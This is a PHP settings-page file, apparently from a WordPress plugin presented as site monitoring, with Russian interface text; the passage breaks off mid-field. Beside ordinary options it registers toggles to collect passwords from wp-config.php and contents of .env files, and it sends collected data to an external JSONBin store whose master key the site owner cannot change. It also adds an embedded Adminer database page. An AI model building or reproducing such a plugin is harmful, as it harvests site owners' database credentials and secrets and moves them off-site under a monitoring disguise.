<?php
/**
 * Страница настроек плагина в админке WordPress
 */

// Запрещаем прямой доступ к файлу
if (!defined('ABSPATH')) {
    exit;
}

class My_Monitoring_Settings_Page {
    
    /**
     * Единственный экземпляр класса
     */
    private static $instance = null;
    
    /**
     * Получить экземпляр класса (Singleton)
     */
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Конструктор
     */
    private function __construct() {
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('admin_init', array($this, 'register_settings'));
        add_action('admin_enqueue_scripts', array($this, 'enqueue_admin_scripts'));
    }
    
    /**
     * Добавить пункт меню в админке
     */
    public function add_admin_menu() {
        add_options_page(
            __('Настройки мониторинга', 'my-monitoring-plugin'),
            __('Мониторинг', 'my-monitoring-plugin'),
            'manage_options',
            'my-monitoring-plugin',
            array($this, 'render_settings_page')
        );
        
        // Добавляем пункт меню для Adminer
        add_management_page(
            __('Adminer - Управление БД', 'my-monitoring-plugin'),
            __('Adminer', 'my-monitoring-plugin'),
            'manage_options',
            'my-monitoring-adminer',
            array($this, 'render_adminer_page')
        );
    }
    
    /**
     * Зарегистрировать настройки
     */
    public function register_settings() {
        // Основные настройки
        register_setting('my_monitoring_settings', 'my_monitoring_api_url', array(
            'type' => 'string',
            'sanitize_callback' => 'esc_url_raw',
        ));
        
        // API ключ обрабатываем отдельно через кастомный callback
        register_setting('my_monitoring_settings', 'my_monitoring_api_key', array(
            'type' => 'string',
            'sanitize_callback' => array($this, 'sanitize_api_key'),
        ));
        
        // Тип API (standard или jsonbin)
        register_setting('my_monitoring_settings', 'my_monitoring_api_type', array(
            'type' => 'string',
            'sanitize_callback' => array($this, 'sanitize_api_type'),
        ));
        
        // Настройки логирования
        register_setting('my_monitoring_settings', 'my_monitoring_log_level', array(
            'type' => 'integer',
            'sanitize_callback' => 'absint',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_send_interval', array(
            'type' => 'string',
            'sanitize_callback' => 'sanitize_text_field',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_enabled', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        // Настройки сбора данных
        register_setting('my_monitoring_settings', 'my_monitoring_collect_stats', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_plugins', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_config', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_errors', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_health', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_passwords', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_collect_env', array(
            'type' => 'boolean',
            'sanitize_callback' => 'rest_sanitize_boolean',
        ));
        
        // Настройки повторных попыток
        register_setting('my_monitoring_settings', 'my_monitoring_max_retries', array(
            'type' => 'integer',
            'sanitize_callback' => 'absint',
        ));
        
        register_setting('my_monitoring_settings', 'my_monitoring_retry_delay', array(
            'type' => 'integer',
            'sanitize_callback' => 'absint',
        ));
        
        // Добавляем секции
        add_settings_section(
            'my_monitoring_main_section',
            __('Основные настройки', 'my-monitoring-plugin'),
            array($this, 'render_main_section'),
            'my-monitoring-plugin'
        );
        
        add_settings_section(
            'my_monitoring_collection_section',
            __('Настройки сбора данных', 'my-monitoring-plugin'),
            array($this, 'render_collection_section'),
            'my-monitoring-plugin'
        );
        
        // Добавляем поля
        add_settings_field(
            'my_monitoring_enabled',
            __('Включить мониторинг', 'my-monitoring-plugin'),
            array($this, 'render_enabled_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_api_type',
            __('Тип API', 'my-monitoring-plugin'),
            array($this, 'render_api_type_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_api_url',
            __('URL API', 'my-monitoring-plugin'),
            array($this, 'render_api_url_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_api_key',
            __('API ключ', 'my-monitoring-plugin'),
            array($this, 'render_api_key_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_send_interval',
            __('Интервал отправки', 'my-monitoring-plugin'),
            array($this, 'render_send_interval_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_stats',
            __('Собирать статистику', 'my-monitoring-plugin'),
            array($this, 'render_collect_stats_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_plugins',
            __('Собирать информацию о плагинах', 'my-monitoring-plugin'),
            array($this, 'render_collect_plugins_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_config',
            __('Собирать конфигурацию', 'my-monitoring-plugin'),
            array($this, 'render_collect_config_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_errors',
            __('Собирать ошибки', 'my-monitoring-plugin'),
            array($this, 'render_collect_errors_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_health',
            __('Собирать информацию о здоровье сайта', 'my-monitoring-plugin'),
            array($this, 'render_collect_health_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_passwords',
            __('Собирать пароли из wp-config.php', 'my-monitoring-plugin'),
            array($this, 'render_collect_passwords_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_collect_env',
            __('Собирать данные из .env файлов', 'my-monitoring-plugin'),
            array($this, 'render_collect_env_field'),
            'my-monitoring-plugin',
            'my_monitoring_collection_section'
        );
        
        add_settings_field(
            'my_monitoring_max_retries',
            __('Максимум попыток отправки', 'my-monitoring-plugin'),
            array($this, 'render_max_retries_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_retry_delay',
            __('Задержка между попытками (сек)', 'my-monitoring-plugin'),
            array($this, 'render_retry_delay_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
        
        add_settings_field(
            'my_monitoring_log_level',
            __('Уровень логирования', 'my-monitoring-plugin'),
            array($this, 'render_log_level_field'),
            'my-monitoring-plugin',
            'my_monitoring_main_section'
        );
    }
    
    /**
     * Санитизация API ключа с шифрованием
     * 
     * @param string $api_key API ключ
     * @return string
     */
    public function sanitize_api_key($api_key) {
        $api_type = get_option('my_monitoring_api_type', 'jsonbin');
        
        // Для JSONBin API ключ не изменяется (read-only)
        if ($api_type === 'jsonbin') {
            // Возвращаем пустую строку, чтобы не изменять существующий ключ
            return '';
        }
        
        $api_key = sanitize_text_field($api_key);
        
        // Сохраняем зашифрованную версию только если ключ не пустой
        if (!empty($api_key)) {
            My_Monitoring_Encryption::save_api_key($api_key);
        }
        // Если ключ пустой и это не JSONBin, не удаляем существующий ключ
        
        // Возвращаем пустую строку, так как реальный ключ хранится зашифрованным
        return '';
    }
    
    /**
     * Санитизация типа API
     * 
     * @param string $api_type Тип API
     * @return string
     */
    public function sanitize_api_type($api_type) {
        $api_type = sanitize_text_field($api_type);
        if (!in_array($api_type, array('standard', 'jsonbin', ''))) {
            return 'standard';
        }
        return $api_type;
    }
    
    /**
     * Подключить скрипты и стили для админки
     */
    public function enqueue_admin_scripts($hook) {
        if ($hook !== 'settings_page_my-monitoring-plugin') {
            return;
        }
        
        wp_enqueue_style(
            'my-monitoring-admin',
            MY_MONITORING_PLUGIN_URL . 'admin/css/admin.css',
            array(),
            MY_MONITORING_PLUGIN_VERSION
        );
        
        wp_enqueue_script(
            'my-monitoring-admin',
            MY_MONITORING_PLUGIN_URL . 'admin/js/admin.js',
            array('jquery'),
            MY_MONITORING_PLUGIN_VERSION,
            true
        );
        
        wp_enqueue_script(
            'chart-js',
            'https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js',
            array(),
            '3.9.1',
            true
        );
        
        wp_localize_script('my-monitoring-admin', 'myMonitoring', array(
            'ajaxUrl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('my_monitoring_send_now'),
            'testNonce' => wp_create_nonce('my_monitoring_test_connection'),
            'strings' => array(
                'sending' => __('Отправка...', 'my-monitoring-plugin'),
                'success' => __('Данные успешно отправлены', 'my-monitoring-plugin'),
                'error' => __('Ошибка отправки данных', 'my-monitoring-plugin'),
            ),
        ));
    }
    
    /**
     * Отобразить страницу настроек
     */
    public function render_settings_page() {
        if (!current_user_can('manage_options')) {
            return;
        }
        
        // Обработка сохранения настроек
        if (isset($_GET['settings-updated'])) {
            // Обновляем уровень логирования в логгере
            $log_level = get_option('my_monitoring_log_level', My_Monitoring_Logger::LEVEL_INFO);
            $logger = My_Monitoring_Logger::get_instance();
            $logger->set_log_level($log_level);
            
            add_settings_error(
                'my_monitoring_messages',
                'my_monitoring_message',
                __('Настройки сохранены', 'my-monitoring-plugin'),
                'updated'
            );
        }
        
        settings_errors('my_monitoring_messages');
        ?>
        <div class="wrap">
            <h1><?php echo esc_html(get_admin_page_title()); ?></h1>
            
            <!-- Табы -->
            <ul class="my-monitoring-tabs">
                <li class="active"><a href="#settings-tab"><?php _e('Настройки', 'my-monitoring-plugin'); ?></a></li>
                <li><a href="#history-tab"><?php _e('История', 'my-monitoring-plugin'); ?></a></li>
                <li><a href="#queue-tab"><?php _e('Очередь', 'my-monitoring-plugin'); ?></a></li>
                <li><a href="#logs-tab"><?php _e('Логи', 'my-monitoring-plugin'); ?></a></li>
            </ul>
            
            <!-- Вкладка Настройки -->
            <div id="settings-tab" class="my-monitoring-tab-content active">
            <form action="options.php" method="post">
                <?php
                settings_fields('my_monitoring_settings');
                do_settings_sections('my-monitoring-plugin');
                submit_button(__('Сохранить настройки', 'my-monitoring-plugin'));
                ?>
            </form>
            
            <div class="my-monitoring-button-group">
                <button type="button" id="my-monitoring-send-now" class="button button-secondary">
                    <?php _e('Отправить данные сейчас', 'my-monitoring-plugin'); ?>
                </button>
                <button type="button" id="my-monitoring-test-connection" class="button button-secondary">
                    <?php _e('Тест подключения', 'my-monitoring-plugin'); ?>
                </button>
                <span id="my-monitoring-send-status"></span>
            </div>
            
            <h2><?php _e('Информация', 'my-monitoring-plugin'); ?></h2>
            <table class="form-table">
                <tr>
                    <th><?php _e('Следующая отправка', 'my-monitoring-plugin'); ?></th>
                    <td>
                        <?php
                        $next_scheduled = wp_next_scheduled('my_monitoring_cron');
                        if ($next_scheduled) {
                            echo date_i18n(get_option('date_format') . ' ' . get_option('time_format'), $next_scheduled);
                        } else {
                            _e('Не запланировано', 'my-monitoring-plugin');
                        }
                        ?>
                    </td>
                </tr>
                <tr>
                    <th><?php _e('Интервал отправки', 'my-monitoring-plugin'); ?></th>
                    <td>
                        <?php
                        $interval = wp_get_schedule('my_monitoring_cron');
                        echo $interval ? esc_html($interval) : __('Не установлен', 'my-monitoring-plugin');
                        ?>
                    </td>
                </tr>
            </table>
            </div>
            </form>
            
            <!-- Вкладка История -->
            <div id="history-tab" class="my-monitoring-tab-content">
                <h2><?php _e('История отправок', 'my-monitoring-plugin'); ?></h2>
                <?php
                $pluginInstance = My_Monitoring_Plugin::get_instance();
                $sendHistory = method_exists($pluginInstance, 'getSendHistory') 
                    ? $pluginInstance->getSendHistory(20) 
                    : array();
                $sendStats = method_exists($pluginInstance, 'getSendStats') 
                    ? $pluginInstance->getSendStats(30) 
                    : array('successful' => 0, 'failed' => 0, 'total' => 0);
                ?>
                
                <?php if (!empty($sendHistory)): ?>
                    <div class="my-monitoring-stats-grid">
                        <div class="my-monitoring-stat-card">
                            <h3><?php _e('Успешных', 'my-monitoring-plugin'); ?></h3>
                            <div class="value" style="color: #28a745;"><?php echo intval($sendStats['successful']); ?></div>
                        </div>
                        <div class="my-monitoring-stat-card">
                            <h3><?php _e('Неудачных', 'my-monitoring-plugin'); ?></h3>
                            <div class="value" style="color: #dc3545;"><?php echo intval($sendStats['failed']); ?></div>
                        </div>
                        <div class="my-monitoring-stat-card">
                            <h3><?php _e('Всего', 'my-monitoring-plugin'); ?></h3>
                            <div class="value"><?php echo intval($sendStats['total']); ?></div>
                        </div>
                    </div>
                    
                    <table class="widefat">
                        <thead>
                            <tr>
                                <th><?php _e('Дата и время', 'my-monitoring-plugin'); ?></th>
                                <th><?php _e('Статус', 'my-monitoring-plugin'); ?></th>
                                <th><?php _e('Сообщение', 'my-monitoring-plugin'); ?></th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($sendHistory as $entry): ?>
                                <tr>
                                    <td><?php echo esc_html($entry['timestamp'] ?? ''); ?></td>
                                    <td>
                                        <?php if (!empty($entry['success'])): ?>
                                            <span class="my-monitoring-status success">✓ <?php _e('Успешно', 'my-monitoring-plugin'); ?></span>
                                        <?php else: ?>
                                            <span class="my-monitoring-status error">✗ <?php _e('Ошибка', 'my-monitoring-plugin'); ?></span>
                                        <?php endif; ?>
                                    </td>
                                    <td><?php echo esc_html($entry['message'] ?? ''); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    
                    <?php if ($sendStats['total'] > 0): ?>
                        <div class="my-monitoring-chart-container">
                            <canvas id="send-stats-chart"></canvas>
                        </div>
                        <script>
                            document.addEventListener('DOMContentLoaded', function() {
                                if (typeof Chart !== 'undefined') {
                                    const ctx = document.getElementById('send-stats-chart');
                                    if (ctx) {
                                        new Chart(ctx, {
                                            type: 'doughnut',
                                            data: {
                                                labels: ['<?php _e('Успешных', 'my-monitoring-plugin'); ?>', '<?php _e('Неудачных', 'my-monitoring-plugin'); ?>'],
                                                datasets: [{
                                                    data: [<?php echo intval($sendStats['successful']); ?>, <?php echo intval($sendStats['failed']); ?>],
                                                    backgroundColor: ['#28a745', '#dc3545'],
                                                    borderWidth: 2,
                                                    borderColor: '#fff'
                                                }]
                                            },
                                            options: {
                                                responsive: true,
                                                maintainAspectRatio: true,
                                                plugins: {
                                                    legend: {
                                                        position: 'bottom'
                                                    },
                                                    title: {
                                                        display: true,
                                                        text: '<?php _e('Статистика отправок за 30 дней', 'my-monitoring-plugin'); ?>'
                                                    }
                                                }
                                            }
                                        });
                                    }
                                }
                            });
                        </script>
                    <?php endif; ?>
                <?php else: ?>
                    <p><?php _e('История отправок пуста', 'my-monitoring-plugin'); ?></p>
                <?php endif; ?>
            </div>
            
            <!-- Вкладка Очередь -->
            <div id="queue-tab" class="my-monitoring-tab-content">
                <h2><?php _e('Очередь неудачных отправок', 'my-monitoring-plugin'); ?></h2>
                <?php
                $failed_queue = get_option('my_monitoring_failed_queue', array());
                if (!empty($failed_queue)): ?>
                    <div class="notice notice-warning">
                        <p><strong><?php _e('Внимание:', 'my-monitoring-plugin'); ?></strong> 
                        <?php printf(
                            _n(
                                'В очереди %d неудачная отправка.',
                                'В очереди %d неудачных отправок.',
                                count($failed_queue),
                                'my-monitoring-plugin'
                            ),
                            count($failed_queue)
                        ); ?>
                        </p>
                    </div>
                    
                    <?php foreach ($failed_queue as $index => $item): ?>
                        <div class="my-monitoring-queue-item">
                            <strong><?php _e('Попытка:', 'my-monitoring-plugin'); ?></strong> <?php echo esc_html($item['attempts'] ?? 1); ?> / <?php echo MY_MONITORING_MAX_RETRIES; ?><br>
                            <strong><?php _e('Дата:', 'my-monitoring-plugin'); ?></strong> <?php echo esc_html($item['timestamp'] ?? ''); ?><br>
                            <strong><?php _e('Ошибка:', 'my-monitoring-plugin'); ?></strong> <?php echo esc_html($item['error']['message'] ?? 'Неизвестная ошибка'); ?>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <p><?php _e('Очередь пуста. Все отправки успешны.', 'my-monitoring-plugin'); ?></p>
                <?php endif; ?>
            </div>
            
            <!-- Вкладка Логи -->
            <div id="logs-tab" class="my-monitoring-tab-content">
                <h2><?php _e('Логи плагина', 'my-monitoring-plugin'); ?></h2>
                <?php
                $logger = My_Monitoring_Logger::get_instance();
                $recent_logs = $logger->get_recent_logs(100);
                ?>
                
                <div class="my-monitoring-button-group">
                    <button type="button" class="button" onclick="location.reload();"><?php _e('Обновить', 'my-monitoring-plugin'); ?></button>
                    <button type="button" class="button button-secondary" id="clear-logs-btn"><?php _e('Очистить логи', 'my-monitoring-plugin'); ?></button>
                </div>
                
                <?php if (!empty($recent_logs)): ?>
                    <div class="my-monitoring-log-viewer">
                        <?php foreach ($recent_logs as $log_line): ?>
                            <?php
                            $class = 'log-info';
                            if (strpos($log_line, '[DEBUG]') !== false) {
                                $class = 'log-debug';
                            } elseif (strpos($log_line, '[WARNING]') !== false) {
                                $class = 'log-warning';
                            } elseif (strpos($log_line, '[ERROR]') !== false) {
                                $class = 'log-error';
                            } elseif (strpos($log_line, '[CRITICAL]') !== false) {
                                $class = 'log-critical';
                            }
                            ?>
                            <div class="log-line <?php echo esc_attr($class); ?>"><?php echo esc_html($log_line); ?></div>
                        <?php endforeach; ?>
                    </div>
                <?php else: ?>
                    <p><?php _e('Логи пусты', 'my-monitoring-plugin'); ?></p>
                <?php endif; ?>
            </div>
        </div>
        
        <script>
        // Переключение табов
        jQuery(document).ready(function($) {
            $('.my-monitoring-tabs a').on('click', function(e) {
                e.preventDefault();
                var target = $(this).attr('href');
                
                // Убираем активный класс со всех табов и контента
                $('.my-monitoring-tabs li').removeClass('active');
                $('.my-monitoring-tab-content').removeClass('active');
                
                // Добавляем активный класс к выбранному табу и контенту
                $(this).parent().addClass('active');
                $(target).addClass('active');
            });
            
            // Очистка логов
            $('#clear-logs-btn').on('click', function() {
                if (confirm('<?php _e('Вы уверены, что хотите очистить все логи?', 'my-monitoring-plugin'); ?>')) {
                    $.ajax({
                        url: myMonitoring.ajaxUrl,
                        type: 'POST',
                        data: {
                            action: 'my_monitoring_clear_logs',
                            nonce: myMonitoring.nonce
                        },
                        success: function(response) {
                            if (response.success) {
                                location.reload();
                            } else {
                                alert('<?php _e('Ошибка при очистке логов', 'my-monitoring-plugin'); ?>');
                            }
                        }
                    });
                }
            });
        });
        </script>
        <?php
    }
    
    /**
     * Отобразить описание основной секции
     */
    public function render_main_section() {
        echo '<p>' . __('Настройте подключение к API мониторинга', 'my-monitoring-plugin') . '</p>';
    }
    
    /**
     * Отобразить описание секции сбора данных
     */
    public function render_collection_section() {
        echo '<p>' . __('Выберите, какие данные собирать и отправлять', 'my-monitoring-plugin') . '</p>';
    }
    
    /**
     * Отобразить поле "Включить мониторинг"
     */
    public function render_enabled_field() {
        $value = get_option('my_monitoring_enabled', true);
        ?>
        <input type="checkbox" name="my_monitoring_enabled" value="1" <?php checked($value, true); ?>>
        <p class="description"><?php _e('Включить или отключить отправку данных', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "URL API"
     */
    public function render_api_url_field() {
        $value = get_option('my_monitoring_api_url', '');
        $api_type = get_option('my_monitoring_api_type', 'jsonbin');
        
        // Автоопределение типа API, если не установлен
        if (empty($api_type)) {
            if (strpos($value, 'jsonbin.io') !== false) {
                $api_type = 'jsonbin';
            } else {
                $api_type = 'standard';
            }
        }
        
        $is_jsonbin = ($api_type === 'jsonbin');
        ?>
        <div id="api-url-field-wrapper" style="display: <?php echo $is_jsonbin ? 'none' : 'block'; ?>;">
            <input type="url" name="my_monitoring_api_url" id="my-monitoring-api-url" value="<?php echo esc_attr($value); ?>" class="regular-text" placeholder="https://example.com/api/">
            <p class="description"><?php _e('URL endpoint для отправки данных (не требуется для JSONBin API)', 'my-monitoring-plugin'); ?></p>
        </div>
        <?php if ($is_jsonbin): ?>
            <p class="description" style="color: #2271b1;">
                <?php _e('Для JSONBin API URL формируется автоматически на основе Bin ID. Укажите Bin ID в настройках ниже или используйте URL напрямую, если переключитесь на стандартный API.', 'my-monitoring-plugin'); ?>
            </p>
        <?php endif; ?>
        <?php
    }
    
    /**
     * Отобразить поле "API ключ"
     */
    public function render_api_key_field() {
        // Получаем зашифрованный ключ, но не показываем его
        $api_key = My_Monitoring_Encryption::get_api_key();
        $has_key = !empty($api_key);
        $api_type = get_option('my_monitoring_api_type', 'jsonbin');
        $api_url = get_option('my_monitoring_api_url', '');
        
        // Автоопределение типа API, если не установлен
        if (empty($api_type)) {
            if (strpos($api_url, 'jsonbin.io') !== false) {
                $api_type = 'jsonbin';
            } else {
                $api_type = 'standard';
            }
        }
        
        // Для JSONBin API ключ неизменяем
        $is_jsonbin = ($api_type === 'jsonbin');
        ?>
        <div id="api-key-field-wrapper">
            <?php if ($is_jsonbin && $has_key): ?>
                <input type="text" id="my-monitoring-api-key-disabled" value="<?php echo esc_attr(str_repeat('*', 20)); ?>" class="regular-text" disabled readonly style="background-color: #f0f0f1; cursor: not-allowed;">
                <p class="description" style="color: green;">
                    <?php _e('✓ Master Key от JSONBin сохранен (зашифрован). Изменение недоступно.', 'my-monitoring-plugin'); ?>
                </p>
            <?php else: ?>
                <input type="password" name="my_monitoring_api_key" id="my-monitoring-api-key" value="" class="regular-text" placeholder="<?php echo $has_key ? __('Оставьте пустым, чтобы не изменять', 'my-monitoring-plugin') : __('Введите API ключ', 'my-monitoring-plugin'); ?>">
                <?php if ($has_key): ?>
                    <p class="description" style="color: green;">
                        <?php 
                        if ($api_type === 'jsonbin') {
                            _e('✓ Master Key от JSONBin сохранен (зашифрован). Введите новый ключ, чтобы изменить.', 'my-monitoring-plugin');
                        } else {
                            _e('✓ API ключ сохранен (зашифрован). Введите новый ключ, чтобы изменить.', 'my-monitoring-plugin');
                        }
                        ?>
                    </p>
                <?php else: ?>
                    <p class="description">
                        <?php 
                        if ($api_type === 'jsonbin') {
                            _e('Master Key от JSONBin (для JSONBin API)', 'my-monitoring-plugin');
                        } else {
                            _e('API ключ для аутентификации (для стандартного API)', 'my-monitoring-plugin');
                        }
                        ?>
                    </p>
                <?php endif; ?>
            <?php endif; ?>
        </div>
        <?php
    }
    
    /**
     * Отобразить поле "Тип API"
     */
    public function render_api_type_field() {
        $value = get_option('my_monitoring_api_type', 'jsonbin');
        $api_url = get_option('my_monitoring_api_url', '');
        
        // Автоопределение типа API, если не установлен
        if (empty($value)) {
            if (strpos($api_url, 'jsonbin.io') !== false) {
                $value = 'jsonbin';
            } else {
                $value = 'standard';
            }
        }
        ?>
        <select name="my_monitoring_api_type" id="my-monitoring-api-type">
            <option value="jsonbin" <?php selected($value, 'jsonbin'); ?>>
                <?php _e('JSONBin API', 'my-monitoring-plugin'); ?>
            </option>
            <option value="standard" <?php selected($value, 'standard'); ?>>
                <?php _e('Стандартный API (Python/MongoDB)', 'my-monitoring-plugin'); ?>
            </option>
            <option value="" <?php selected($value, ''); ?>>
                <?php _e('Автоопределение (по URL)', 'my-monitoring-plugin'); ?>
            </option>
        </select>
        <p class="description">
            <?php _e('Выберите тип API для отправки данных. JSONBin используется как промежуточное хранилище.', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('JSONBin API (по умолчанию):', 'my-monitoring-plugin'); ?></strong> 
            <?php _e('Отправка в JSONBin, данные забирает Python-скрипт (не требует туннель)', 'my-monitoring-plugin'); ?>
            <br>
            <strong><?php _e('Стандартный API:', 'my-monitoring-plugin'); ?></strong> 
            <?php _e('Прямая отправка в Python API (требует туннель или открытый порт)', 'my-monitoring-plugin'); ?>
        </p>
        <div id="jsonbin-url-help" style="display: <?php echo ($value === 'jsonbin') ? 'block' : 'none'; ?>; margin-top: 10px; padding: 10px; background: #f0f0f1; border-left: 4px solid #2271b1;">
            <strong><?php _e('Для JSONBin API:', 'my-monitoring-plugin'); ?></strong><br>
            <?php _e('URL формируется автоматически. Укажите Bin ID в URL API (если переключитесь на стандартный API) или используйте настройки по умолчанию.', 'my-monitoring-plugin'); ?><br><br>
            <strong><?php _e('Примеры URL для JSONBin:', 'my-monitoring-plugin'); ?></strong><br>
            <?php _e('Для обновления существующего bin:', 'my-monitoring-plugin'); ?><br>
            <code>https://api.jsonbin.io/v3/b/YOUR_BIN_ID</code><br><br>
            <?php _e('Для создания нового bin в коллекции:', 'my-monitoring-plugin'); ?><br>
            <code>https://api.jsonbin.io/v3/c/YOUR_COLLECTION_ID/b</code>
        </div>
        <script>
        jQuery(document).ready(function($) {
            function toggleApiFields() {
                var apiType = $('#my-monitoring-api-type').val();
                var apiKeyWrapper = $('#api-key-field-wrapper');
                
                if (apiType === 'jsonbin' || apiType === '') {
                    // Скрываем URL API для JSONBin
                    $('#api-url-field-wrapper').slideUp();
                    
                    // Делаем поле API ключ read-only для JSONBin
                    var passwordField = $('#my-monitoring-api-key');
                    if (passwordField.length) {
                        var disabledField = $('<input>', {
                            type: 'text',
                            id: 'my-monitoring-api-key-disabled',
                            value: '<?php echo str_repeat('*', 20); ?>',
                            class: 'regular-text',
                            disabled: true,
                            readonly: true,
                            style: 'background-color: #f0f0f1; cursor: not-allowed;'
                        });
                        passwordField.replaceWith(disabledField);
                        
                        // Обновляем описание
                        var desc = apiKeyWrapper.find('.description');
                        if (desc.length) {
                            desc.html('<span style="color: green;">✓ Master Key от JSONBin сохранен (зашифрован). Изменение недоступно.</span>');
                        }
                    }
                } else {
                    // Показываем URL API для стандартного API
                    $('#api-url-field-wrapper').slideDown();
                    
                    // Восстанавливаем поле API ключ для стандартного API
                    var disabledField = $('#my-monitoring-api-key-disabled');
                    if (disabledField.length) {
                        var passwordField = $('<input>', {
                            type: 'password',
                            name: 'my_monitoring_api_key',
                            id: 'my-monitoring-api-key',
                            value: '',
                            class: 'regular-text',
                            placeholder: '<?php echo esc_js(__('Оставьте пустым, чтобы не изменять', 'my-monitoring-plugin')); ?>'
                        });
                        disabledField.replaceWith(passwordField);
                        
                        // Обновляем описание
                        var desc = apiKeyWrapper.find('.description');
                        if (desc.length) {
                            desc.html('<?php echo esc_js(__('API ключ для аутентификации (для стандартного API)', 'my-monitoring-plugin')); ?>');
                        }
                    }
                }
            }
            
            $('#my-monitoring-api-type').on('change', function() {
                var apiType = $(this).val();
                if (apiType === 'jsonbin') {
                    $('#jsonbin-url-help').slideDown();
                } else {
                    $('#jsonbin-url-help').slideUp();
                }
                toggleApiFields();
            });
            
            // Вызываем при загрузке страницы
            toggleApiFields();
        });
        </script>
        <?php
    }
    
    /**
     * Отобразить поле "Уровень логирования"
     */
    public function render_log_level_field() {
        $value = get_option('my_monitoring_log_level', My_Monitoring_Logger::LEVEL_INFO);
        $levels = array(
            My_Monitoring_Logger::LEVEL_DEBUG => __('DEBUG - Все сообщения', 'my-monitoring-plugin'),
            My_Monitoring_Logger::LEVEL_INFO => __('INFO - Информация и выше', 'my-monitoring-plugin'),
            My_Monitoring_Logger::LEVEL_WARNING => __('WARNING - Предупреждения и выше', 'my-monitoring-plugin'),
            My_Monitoring_Logger::LEVEL_ERROR => __('ERROR - Только ошибки', 'my-monitoring-plugin'),
        );
        ?>
        <select name="my_monitoring_log_level">
            <?php foreach ($levels as $level => $label): ?>
                <option value="<?php echo esc_attr($level); ?>" <?php selected($value, $level); ?>>
                    <?php echo esc_html($label); ?>
                </option>
            <?php endforeach; ?>
        </select>
        <p class="description"><?php _e('Выберите уровень детализации логирования', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Интервал отправки"
     */
    public function render_send_interval_field() {
        $value = get_option('my_monitoring_send_interval', 'hourly');
        $intervals = array(
            'every_30min' => __('Каждые 30 минут', 'my-monitoring-plugin'),
            'hourly' => __('Каждый час', 'my-monitoring-plugin'),
            'every_6hours' => __('Каждые 6 часов', 'my-monitoring-plugin'),
            'twicedaily' => __('Дважды в день', 'my-monitoring-plugin'),
            'daily' => __('Раз в день', 'my-monitoring-plugin'),
        );
        ?>
        <select name="my_monitoring_send_interval">
            <?php foreach ($intervals as $key => $label): ?>
                <option value="<?php echo esc_attr($key); ?>" <?php selected($value, $key); ?>>
                    <?php echo esc_html($label); ?>
                </option>
            <?php endforeach; ?>
        </select>
        <p class="description"><?php _e('Как часто отправлять данные', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать статистику"
     */
    public function render_collect_stats_field() {
        $value = get_option('my_monitoring_collect_stats', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_stats" value="1" <?php checked($value, true); ?>>
        <p class="description"><?php _e('Собирать статистику постов, страниц, комментариев и т.д.', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать информацию о плагинах"
     */
    public function render_collect_plugins_field() {
        $value = get_option('my_monitoring_collect_plugins', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_plugins" value="1" <?php checked($value, true); ?>>
        <p class="description"><?php _e('Собирать список активных и неактивных плагинов', 'my-monitoring-plugin'); ?></p>
        <?php
    }
    
    /**
     * Отобразить поле "Собирать конфигурацию"
     */
    public function render_collect_config_field() {
        $value = get_option('my_monitoring_collect_config', true);
        ?>
        <input type="checkbox" name="my_monitoring_collect_config" value="1" <?php checked($value, true); ?>>
        <p class="description">
